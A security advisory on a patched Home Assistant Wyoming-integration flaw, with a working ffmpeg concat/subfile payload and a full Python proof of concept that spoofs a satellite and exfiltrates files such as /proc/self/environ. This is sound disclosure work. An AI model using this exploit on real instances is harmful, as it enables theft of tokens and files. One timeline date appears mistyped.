# Introduction

This write-up describes a vulnerability found in [Home Assistant](https://www.home-assistant.io/) (HA), a popular open source home automation software. The vulnerability was found to affect versions between 2023.9 and 2026.6.2 (exclusive), where a patch was introduced. The official advisory was rejected by HA with the reason given that it fell under "non-qualifying vulnerabilities for privilege escalation attacks for logged in users".

# Overview

In the [Wyoming protocol integration](https://www.home-assistant.io/integrations/wyoming/), audio files can be played back. A vulnerability was found in the playback functionality allowing an authenticated attacker to read and exfiltrate arbitrary files.

# Timeline

- **08/06/2026** - We discovered the vulnerability
- **09/06/2026** - Vulnerability report sent to Home Assistant developers
- **09/06/2026** - Later that night, a developer was assigned to the report
- **10/06/2023** - **Home Assistant 2026.6.2 was released, containing the [patch](https://github.com/home-assistant/core/pull/173381) which fixed the issue**
- **18/06/2026** - We enquired if our report was acknowledged
- **23/06/2026** - Home Assistant replied, noting that a patch was already made
- **13/07/2026** - Followed up about disclosing the issue
- **22/07/2026** - Followed up again about disclosure
- **22/07/2026** - Later that night, Home Assistant replied saying an internal discussion is ongoing and will be decided by end of week.
- **25/07/2026** - Followed up for an update
- **28/07/2026** - **Advisory was closed as N/A**
- **29/07/2026** - Public release of this advisory

# Description

HA's Wyoming protocol integration includes an `announce` service that plays audio through an `ffmpeg` subprocess. The `media_id` parameter accepts arbitrary strings and passes them directly to `ffmpeg` as the `-i` input argument.

Handling of `announce` is found in [assist_satellite.py](https://github.com/home-assistant/core/blob/2026.5.4/homeassistant/components/wyoming/assist_satellite.py#L350-L365), where initially the user controlled `announcement` is parsed and used as part of the `ffmpeg` process being spawned:

```py
async def async_announce(self, announcement: AssistSatelliteAnnouncement) -> None:
    """Announce media on the satellite.

    Should block until the announcement is done playing.
    """

    # ...

    try:
        # Use ffmpeg to convert to raw PCM audio with the appropriate format
        proc = await asyncio.create_subprocess_exec(
            self._ffmpeg_manager.binary,
            "-i",
            announcement.media_id, # attacker-controlled
            "-f",
            "s16le",
            "-ac",
            str(SAMPLE_CHANNELS),
            "-ar",
            str(_TTS_SAMPLE_RATE),
            "-nostats",
            "pipe:",
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE,
            close_fds=False,  # use posix_spawn in CPython < 3.13
        )
```

The `announcement.media_id` field is validated as a URL, and its scheme is checked against a blocklist that rejects `http` and `https`. However, `ffmpeg` pseudo-protocols, including `concat:`, `file:`, and `subfile:` are absent from this blocklist and are accepted as valid input. This allows an attacker to pass arbitrary `ffmpeg` protocol strings directly to the subprocess.

Additionally, the `ffmpeg` invocation appends fixed output arguments (`-f s16le -ac 1 -ar 22050`) that instruct `ffmpeg` to transcode the input into raw 16-bit mono PCM. When `ffmpeg` cannot parse a recognised audio header from the input, transcoding fails and no data is emitted. A naive input of `file:///proc/self/environ` therefore produces no output.

To overcome these, the `concat:` pseudo-protocol is used to assemble a synthetic audio header by splicing specific byte ranges from an existing binary using the `subfile:` protocol. `/bin/go2rtc` was chosen as the source because it is present on all HA OS installations with a consistent version and stable byte offsets. These header fragments are assembled as a series of `subfile` slices, with the actual target file appended at the end of the `concat:` chain. This results in `ffmpeg` reading the synthesised header, accepting the trailing target file input as a valid audio stream, and proceeding to transcode it.

Since the audio header matches the output format, the target file's content does not get corrupted and gets streamed to the attacker-controlled Wyoming satellite.

## Constraints

1. The attacker must control a Wyoming Assist Satellite that has been paired with the target HA instance. The initial pairing relies on mDNS discovery, which requires the attacker to be on the same Layer 2 network as HA at setup time. However, once pairing is complete, subsequent exploitation only requires that HA can reach the attacker's TCP listener, which may be on a remote network if the HA instance has internet access or the attacker has a foothold elsewhere on the network.

2. The attacker must possess a valid HA API token.

# Proof of Concept

The audio header constraint can be satisfied by using the following payload prefix, leveraging `/bin/go2rtc`. The target file to be exfiltrated is `/proc/self/environ`, which can be substituted with any local file:

```
concat:subfile,,start,4617501,end,4617505,,:/bin/go2rtc|subfile,,start,1264,end,1268,,:/bin/go2rtc|subfile,,start,18785256,end,18785260,,:/bin/go2rtc|subfile,,start,4610412,end,4610416,,:/bin/go2rtc|subfile,,start,113,end,117,,:/bin/go2rtc|subfile,,start,8989217,end,8989221,,:/bin/go2rtc|subfile,,start,4138466,end,4138470,,:/bin/go2rtc|subfile,,start,4057754,end,4057758,,:/bin/go2rtc|subfile,,start,9896086,end,9896090,,:/bin/go2rtc|subfile,,start,4610389,end,4610393,,:/bin/go2rtc|subfile,,start,18811,end,18815,,:/bin/go2rtc|/proc/self/environ
```

The following Python script can act as a spoofed Wyoming Assist Satellite, as well as sending the actual exploit request:

```py
#!/usr/bin/env python3

import argparse
import asyncio
import json
import logging
import os
import socket
import struct
import urllib.error
import urllib.request
from typing import Dict, Optional, Tuple

logging.basicConfig(level=logging.INFO, format="[%(levelname)s] %(message)s")
log = logging.getLogger("ha-poc-wyoming")

MDNS_ADDR = "224.0.0.251"
MDNS_PORT = 5353
MDNS_TTL = 120
SERVICE_TYPE = "_wyoming._tcp.local."
SATELLITE_NAME = "poc-satellite"
SND_RATE = 22050
SND_WIDTH = 2
SND_CHANNELS = 1
INFO_PAYLOAD = {
    "satellite": {
        "name": SATELLITE_NAME,
        "area": "poc",
        "description": "POC Wyoming Satellite",
        "attribution": {"name": "", "url": ""},
        "installed": True,
        "version": "1.4.1",
        "supports_trigger": False,
        "snd_format": {
            "rate": SND_RATE,
            "width": SND_WIDTH,
            "channels": SND_CHANNELS,
        },
    },
    "asr": [],
    "tts": [],
    "handle": [],
    "intent": [],
    "wake": [],
}

def _encode_name(name: str) -> bytes:
    out = bytearray()
    for label in name.rstrip(".").split("."):
        b = label.encode("utf-8")
        if len(b) > 63:
            raise ValueError("label too long")
        out.append(len(b))
        out.extend(b)
    out.append(0)
    return bytes(out)

def _decode_name(data: bytes, offset: int) -> Tuple[str, int]:
    labels = []
    jumped = False
    original_offset = offset
    while True:
        length = data[offset]
        if length == 0:
            offset += 1
            break
        if length & 0xC0 == 0xC0:
            ptr = ((length & 0x3F) << 8) | data[offset + 1]
            if not jumped:
                original_offset = offset + 2
            offset = ptr
            jumped = True
            continue
        offset += 1
        labels.append(data[offset:offset + length].decode("utf-8", errors="replace"))
        offset += length
    if jumped:
        return ".".join(labels) + ".", original_offset
    return ".".join(labels) + ".", offset

def _build_response(instance_name: str, hostname: str, ip: str, port: int) -> bytes:
    pkt = bytearray()
    pkt += struct.pack(">HHHHHH", 0, 0x8400, 0, 4, 0, 0)
    full_instance = f"{instance_name}.{SERVICE_TYPE}"

    pkt += _encode_name(SERVICE_TYPE)
    ptr_rdata = _encode_name(full_instance)
    pkt += struct.pack(">HHIH", 12, 1, MDNS_TTL, len(ptr_rdata))
    pkt += ptr_rdata

    pkt += _encode_name(full_instance)
    srv_rdata = struct.pack(">HHH", 0, 0, port) + _encode_name(hostname)
    pkt += struct.pack(">HHIH", 33, 0x8001, MDNS_TTL, len(srv_rdata))
    pkt += srv_rdata

    pkt += _encode_name(full_instance)
    txt_entries = [b"version=1.4.1"]
    txt_rdata = b"".join(bytes([len(e)]) + e for e in txt_entries) or b"\x00"
    pkt += struct.pack(">HHIH", 16, 0x8001, MDNS_TTL, len(txt_rdata))
    pkt += txt_rdata

    pkt += _encode_name(hostname)
    a_rdata = socket.inet_aton(ip)
    pkt += struct.pack(">HHIH", 1, 0x8001, MDNS_TTL, len(a_rdata))
    pkt += a_rdata

    return bytes(pkt)

class MDNSResponder(asyncio.DatagramProtocol):
    def __init__(self, instance_name: str, hostname: str, ip: str, port: int):
        self.instance_name = instance_name
        self.hostname = hostname
        self.ip = ip
        self.port = port
        self.transport: Optional[asyncio.DatagramTransport] = None

    def connection_made(self, transport):
        self.transport = transport

    def datagram_received(self, data: bytes, addr):
        if len(data) < 12:
            return
        try:
            _tid, flags, qdcount, _ancount, _, _ = struct.unpack(">HHHHHH", data[:12])
        except struct.error:
            return
        if flags & 0x8000:
            return

        offset = 12
        respond = False
        full_instance_lower = f"{self.instance_name}.{SERVICE_TYPE}".lower()

        for _ in range(qdcount):
            try:
                name, offset = _decode_name(data, offset)
                qtype, _qclass = struct.unpack(">HH", data[offset:offset + 4])
                offset += 4
            except Exception:
                return

            n = name.lower()
            if n == SERVICE_TYPE.lower() and qtype in (12, 255):
                respond = True
            elif n == full_instance_lower and qtype in (33, 16, 255):
                respond = True
            elif n == self.hostname.lower() and qtype in (1, 255):
                respond = True

        if respond and self.transport is not None:
            packet = _build_response(self.instance_name, self.hostname, self.ip, self.port)
            try:
                self.transport.sendto(packet, (MDNS_ADDR, MDNS_PORT))
            except Exception as e:
                log.debug("mDNS send error: %s", e)

    def announce(self):
        if self.transport is None:
            return
        try:
            self.transport.sendto(
                _build_response(self.instance_name, self.hostname, self.ip, self.port),
                (MDNS_ADDR, MDNS_PORT),
            )
        except Exception as e:
            log.debug("mDNS announce error: %s", e)

def _get_local_ip() -> str:
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect(("8.8.8.8", 80))
        return s.getsockname()[0]
    except Exception:
        return "127.0.0.1"
    finally:
        s.close()

async def start_mdns(instance_name: str, host: str, port: int) -> MDNSResponder:
    ip = _get_local_ip()
    hostname = f"{instance_name}.local."
    log.info("mDNS: advertising %s.%s on %s:%d", instance_name, SERVICE_TYPE, ip, port)

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    try:
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEPORT, 1)
    except (AttributeError, OSError):
        pass
    sock.bind(("", MDNS_PORT))
    mreq = struct.pack("=4s4s", socket.inet_aton(MDNS_ADDR), socket.inet_aton("0.0.0.0"))
    sock.setsockopt(socket.IPPROTO_IP, socket.IP_ADD_MEMBERSHIP, mreq)
    sock.setsockopt(socket.IPPROTO_IP, socket.IP_MULTICAST_TTL, 255)
    sock.setsockopt(socket.IPPROTO_IP, socket.IP_MULTICAST_LOOP, 1)

    loop = asyncio.get_running_loop()
    _, protocol = await loop.create_datagram_endpoint(
        lambda: MDNSResponder(instance_name, hostname, ip, port),
        sock=sock,
    )

    async def announce_loop():
        for _ in range(3):
            protocol.announce()
            await asyncio.sleep(1.0)
        while True:
            await asyncio.sleep(60.0)
            protocol.announce()

    asyncio.create_task(announce_loop())
    return protocol

class WyomingProtocolError(Exception):
    pass

async def read_event(reader: asyncio.StreamReader) -> Optional[Tuple[str, dict, bytes]]:
    header_line = await reader.readline()
    if not header_line:
        return None

    try:
        header = json.loads(header_line.decode("utf-8"))
    except json.JSONDecodeError as e:
        raise WyomingProtocolError(f"Bad header JSON: {e!r}: {header_line!r}") from e

    msg_type = header.get("type")
    if not msg_type:
        raise WyomingProtocolError(f"Header missing 'type': {header!r}")

    data = header.get("data") or {}
    data_length = header.get("data_length", 0)
    payload_length = header.get("payload_length", 0)

    if data_length:
        raw_data = await reader.readexactly(data_length)
        try:
            extra = json.loads(raw_data.decode("utf-8"))
        except json.JSONDecodeError as e:
            raise WyomingProtocolError(f"Bad data JSON: {e!r}: {raw_data!r}") from e
        if isinstance(extra, dict):
            data = {**data, **extra}

    payload = b""
    if payload_length:
        payload = await reader.readexactly(payload_length)

    return msg_type, data, payload

async def write_event(
    writer: asyncio.StreamWriter,
    msg_type: str,
    data: Optional[dict] = None,
    payload: Optional[bytes] = None,
) -> None:
    header: dict = {"type": msg_type}
    if data:
        header["data"] = data
    if payload:
        header["payload_length"] = len(payload)

    line = (json.dumps(header, ensure_ascii=False) + "\n").encode("utf-8")
    writer.write(line)
    if payload:
        writer.write(payload)
    await writer.drain()


async def handle_wyoming_client(
    reader: asyncio.StreamReader,
    writer: asyncio.StreamWriter,
    output_file: str,
    exfil_event: asyncio.Event,
):
    peer = writer.get_extra_info("peername")
    log.info("HA connected from %s", peer)

    audio_chunks: list[bytes] = []
    audio_meta: dict = {}
    aplay_proc: Optional[asyncio.subprocess.Process] = None

    try:
        while True:
            try:
                event = await asyncio.wait_for(read_event(reader), timeout=300.0)
            except asyncio.TimeoutError:
                log.info("Idle timeout")
                break
            except asyncio.IncompleteReadError:
                log.info("Client disconnected mid-message")
                break

            if event is None:
                log.info("Client closed connection")
                break

            msg_type, data, payload = event
            log.debug("RX %s data=%s payload=%d", msg_type, data, len(payload))

            if msg_type == "describe":
                await write_event(writer, "info", INFO_PAYLOAD)

            elif msg_type == "run-satellite":
                log.info("HA requests satellite mode")
                await write_event(writer, "satellite-running", {})

            elif msg_type == "audio-start":
                audio_meta = {
                    "rate": data.get("rate", SND_RATE),
                    "width": data.get("width", SND_WIDTH),
                    "channels": data.get("channels", SND_CHANNELS),
                }
                log.info("audio-start %s", audio_meta)
                audio_chunks = []
                try:
                    aplay_proc = await asyncio.create_subprocess_exec(
                        "aplay",
                        "-q",
                        "-r",
                        str(audio_meta["rate"]),
                        "-c",
                        str(audio_meta["channels"]),
                        "-f",
                        "S16_LE",
                        "-t",
                        "raw",
                        stdin=asyncio.subprocess.PIPE,
                        stdout=asyncio.subprocess.DEVNULL,
                        stderr=asyncio.subprocess.DEVNULL,
                    )
                except FileNotFoundError:
                    log.warning("aplay not found; audio will be saved but not played")
                    aplay_proc = None
                except Exception as e:
                    log.warning("Could not start aplay: %s", e)
                    aplay_proc = None

            elif msg_type == "audio-chunk":
                if payload:
                    audio_chunks.append(payload)
                    if aplay_proc and aplay_proc.stdin:
                        try:
                            aplay_proc.stdin.write(payload)
                            await aplay_proc.stdin.drain()
                        except (BrokenPipeError, ConnectionResetError) as e:
                            log.warning("aplay pipe broken: %s", e)
                            aplay_proc = None

            elif msg_type == "audio-stop":
                total = sum(len(c) for c in audio_chunks)
                log.info("audio-stop: %d chunks, %d bytes total", len(audio_chunks), total)
                if aplay_proc and aplay_proc.stdin:
                    try:
                        aplay_proc.stdin.close()
                    except Exception:
                        pass
                    try:
                        await asyncio.wait_for(aplay_proc.wait(), timeout=5.0)
                    except asyncio.TimeoutError:
                        aplay_proc.kill()
                aplay_proc = None

                if audio_chunks:
                    raw = b"".join(audio_chunks)
                    with open(output_file, "wb") as f:
                        f.write(raw)
                    log.info("raw bytes saved to %s (%d bytes)", output_file, len(raw))

                await write_event(writer, "played", {})
                exfil_event.set()

            elif msg_type == "synthesize":
                log.info("synthesize: %r", data.get("text", ""))

            else:
                log.debug("Unhandled message type: %s", msg_type)

    except WyomingProtocolError as e:
        log.error("Protocol error: %s", e)
    except Exception:
        log.exception("Handler error")
    finally:
        if aplay_proc:
            try:
                aplay_proc.kill()
            except Exception:
                pass
        writer.close()
        try:
            await writer.wait_closed()
        except Exception:
            pass
        log.info("Disconnected %s", peer)

def trigger_exfil(
    ha_ip: str,
    ha_port: int,
    ha_token: str,
    entity_id: str,
    target_file: str,
) -> bool:
    url = f"http://{ha_ip}:{ha_port}/api/services/assist_satellite/announce"
    payload = json.dumps({
        "entity_id": entity_id,
        "media_id": target_file,
    }).encode()

    log.info("Triggering Wyoming file exfil:")
    log.info("  URL:        %s", url)
    log.info("  entity_id:  %s", entity_id)
    log.info("  media_id:   %s", target_file)

    req = urllib.request.Request(
        url,
        data=payload,
        headers={
            "Authorization": f"Bearer {ha_token}",
            "Content-Type": "application/json",
        },
        method="POST",
    )
    try:
        with urllib.request.urlopen(req, timeout=30) as resp:
            body = resp.read()
            log.info("Service call response: %d %s", resp.status, body[:200])
            return True
    except urllib.error.HTTPError as e:
        body = e.read()
        log.error("HTTP error %d: %s", e.code, body[:300])
        if e.code == 401:
            log.error("Authentication failed — check HA_TOKEN.")
        elif e.code == 404:
            log.error("Entity not found — check --entity value.")
        return False
    except Exception as e:
        log.error("Request failed: %s", e)
        return False

async def run_wyoming_server(listen_host: str, listen_port: int, output_file: str):
    exfil_event = asyncio.Event()

    async def handler(r, w):
        await handle_wyoming_client(r, w, output_file, exfil_event)

    server = await asyncio.start_server(handler, listen_host, listen_port)
    await start_mdns(SATELLITE_NAME, listen_host, listen_port)
    log.info("Wyoming server listening on %s:%d", listen_host, listen_port)
    log.info("Waiting for HA to connect and stream file contents...")
    log.info("(Pair this satellite with HA first via Settings > Voice Assistants)")

    async with server:
        try:
            await asyncio.wait_for(exfil_event.wait(), timeout=300)
            log.info("[SUCCESS] File exfiltration complete.")
        except asyncio.TimeoutError:
            log.warning("Timeout — no data received in 300 seconds.")
        await server.wait_closed()

def main():
    parser = argparse.ArgumentParser(description="Home Assistant Wyoming PoC")
    parser.add_argument("--mode", required=True, choices=["wyoming-server", "exfil"], help="PoC mode to run")
    parser.add_argument("--ha-ip", default="127.0.0.1", help="HA instance IP")
    parser.add_argument("--ha-port", type=int, default=8123, help="HA HTTP port")
    parser.add_argument("--ha-token", default=os.getenv("HA_TOKEN"), help="HA long-lived token")
    parser.add_argument("--entity", default="assist_satellite.wyoming_poc", help="Wyoming satellite entity_id")
    parser.add_argument("--target-file", default="concat:subfile,,start,4617501,end,4617505,,:/bin/go2rtc|subfile,,start,1264,end,1268,,:/bin/go2rtc|subfile,,start,18785256,end,18785260,,:/bin/go2rtc|subfile,,start,4610412,end,4610416,,:/bin/go2rtc|subfile,,start,113,end,117,,:/bin/go2rtc|subfile,,start,8989217,end,8989221,,:/bin/go2rtc|subfile,,start,4138466,end,4138470,,:/bin/go2rtc|subfile,,start,4057754,end,4057758,,:/bin/go2rtc|subfile,,start,9896086,end,9896090,,:/bin/go2rtc|subfile,,start,4610389,end,4610393,,:/bin/go2rtc|subfile,,start,18811,end,18815,,:/bin/go2rtc|/proc/self/environ", help="File to exfil via ffmpeg")
    parser.add_argument("--listen", default="0.0.0.0:10700", help="Wyoming server listen address")
    parser.add_argument("--output", default="/tmp/ha_exfil", help="Output file prefix for exfil data")
    parser.add_argument("-v", "--verbose", action="store_true")

    args = parser.parse_args()
    if args.verbose:
        logging.getLogger().setLevel(logging.DEBUG)

    if args.mode == "wyoming-server":
        host, port_str = args.listen.rsplit(":", 1)
        port = int(port_str)
        asyncio.run(run_wyoming_server(host, port, args.output))
        return

    if args.mode == "exfil":
        if not args.ha_token:
            parser.error("--ha-token (or HA_TOKEN env var) required for exfil mode")
        ok = trigger_exfil(args.ha_ip, args.ha_port, args.ha_token, args.entity, args.target_file)
        if ok:
            log.info("Service call sent. Ensure your Wyoming server (--mode wyoming-server) is running to receive data.")
        return

if __name__ == "__main__":
    main()
```

First, run the PoC as a Wyoming Assist Satellite:

```bash
$ python3 poc_wyoming.py --mode wyoming-server --listen 0.0.0.0:10700 --output exfil-data

[INFO] mDNS: advertising poc-satellite._wyoming._tcp.local. on 192.168.1.112:10700
[INFO] Wyoming server listening on 0.0.0.0:10700
[INFO] Waiting for HA to connect and stream file contents...
[INFO] (Pair this satellite with HA first via Settings > Voice Assistants)
[INFO] HA connected from ('192.168.1.110', 42762)
[INFO] Client closed connection
[INFO] Disconnected ('192.168.1.110', 42762)
```

Observe that HA discovered this service almost immediately. Proceed to add this device on the HA dashboard (it will be shown as a discovered device). Select "local voice processing" for the voice setup step (the process does not need to be completed).

In another terminal, run the PoC in "exfil" mode:

```bash
$ python3 poc_wyoming.py --mode exfil --ha-ip 192.168.1.110 --ha-port 8123 \
      --ha-token '<REDACTED>' \
      --entity assist_satellite.poc_satellite \
      --target-file 'concat:subfile,,start,4617501,end,4617505,,:/bin/go2rtc|subfile,,start,1264,end,1268,,:/bin/go2rtc|subfile,,start,18785256,end,18785260,,:/bin/go2rtc|subfile,,start,4610412,end,4610416,,:/bin/go2rtc|subfile,,start,113,end,117,,:/bin/go2rtc|subfile,,start,8989217,end,8989221,,:/bin/go2rtc|subfile,,start,4138466,end,4138470,,:/bin/go2rtc|subfile,,start,4057754,end,4057758,,:/bin/go2rtc|subfile,,start,9896086,end,9896090,,:/bin/go2rtc|subfile,,start,4610389,end,4610393,,:/bin/go2rtc|subfile,,start,18811,end,18815,,:/bin/go2rtc|/proc/self/environ'

[INFO] Triggering Wyoming file exfil:
[INFO]   URL:        http://192.168.1.110:8123/api/services/assist_satellite/announce
[INFO]   entity_id:  assist_satellite.poc_satellite
[INFO]   media_id:   concat:subfile,,start,4617501,end,4617505,,:/bin/go2rtc|subfile,,start,1264,end,1268,,:/bin/go2rtc|subfile,,start,18785256,end,18785260,,:/bin/go2rtc|subfile,,start,4610412,end,4610416,,:/bin/go2rtc|subfile,,start,113,end,117,,:/bin/go2rtc|subfile,,start,8989217,end,8989221,,:/bin/go2rtc|subfile,,start,4138466,end,4138470,,:/bin/go2rtc|subfile,,start,4057754,end,4057758,,:/bin/go2rtc|subfile,,start,9896086,end,9896090,,:/bin/go2rtc|subfile,,start,4610389,end,4610393,,:/bin/go2rtc|subfile,,start,18811,end,18815,,:/bin/go2rtc|/proc/self/environ
[INFO] Service call response: 200 b'[{"entity_id":"assist_satellite.poc_satellite","state":"responding","attributes":{"friendly_name":"poc-satellite","supported_features":1},"last_changed":"2026-06-03T16:01:57.100488+00:00","last_report'
[INFO] Service call sent. Ensure your Wyoming server (--mode wyoming-server) is running to receive data.
```

In the first terminal, observe that it received data from HA:

```bash
[INFO] audio-start {'rate': 22050, 'width': 2, 'channels': 1}
[WARNING] aplay not found; audio will be saved but not played
[INFO] audio-stop: 1 chunks, 1002 bytes total
[INFO] raw bytes saved to exfil-data (1002 bytes)
```

Proceed to read the `exfil-data` output file and the content of `/proc/self/environ` will be shown:

```
$ cat exfil-data

...
HASSIO_TOKEN=<REDACTED>
SUPERVISOR=172.30.32.2
SUPERVISOR_TOKEN=<REDACTED>
SHLVL=2
PATH=/command:/usr/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
S6_CMD_WAIT_FOR_SERVICES=1OLD
PWD=/run/s6/legacy-services/home-assistant
HASSIO=172.30.32.2
LINES=24
COLUMNS=80
```

# Impact

An authenticated user with a paired Wyoming Assist Satellite will be able to read any file on disk as the instance is running as root. This includes all system files, such as `/proc/self/environ` which contains sensitive tokens used by HA. This could lead to compromise of the entire instance or hosting infrastructure.

# Discovered

- June 2026, Jia Hao Poh, elttam
